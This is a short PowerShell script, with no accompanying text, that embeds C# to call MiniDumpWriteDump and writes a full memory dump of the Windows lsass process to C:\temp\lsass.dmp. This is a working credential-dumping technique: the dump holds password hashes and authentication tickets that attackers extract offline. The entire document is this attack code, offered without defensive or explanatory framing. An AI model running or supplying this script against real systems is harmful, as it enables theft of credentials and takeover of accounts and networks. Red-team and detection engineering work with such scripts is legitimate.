$Source = @"
using System;
using System.Runtime.InteropServices;

namespace ProcDump {
    public static class DbgHelp {
        [DllImport("Dbghelp.dll")]
        public static extern bool MiniDumpWriteDump(IntPtr hProcess, uint ProcessId, IntPtr hFile, IntPtr DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);
    }
}
"@

Add-Type -TypeDefinition $Source

$Process = [System.Diagnostics.Process]::GetProcessesByName("lsass")
$DumpPath = "C:\temp\$($Process.Name).dmp"

$DumpStream = [System.IO.FileStream]::new($DumpPath, [System.IO.FileMode]::Create)
$DumpType = [IntPtr]::new(2)
$Dump = [ProcDump.DbgHelp]::MiniDumpWriteDump($Process.Handle, $Process.Id, $DumpStream.Handle, $DumpType, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
$DumpStream.Dispose()
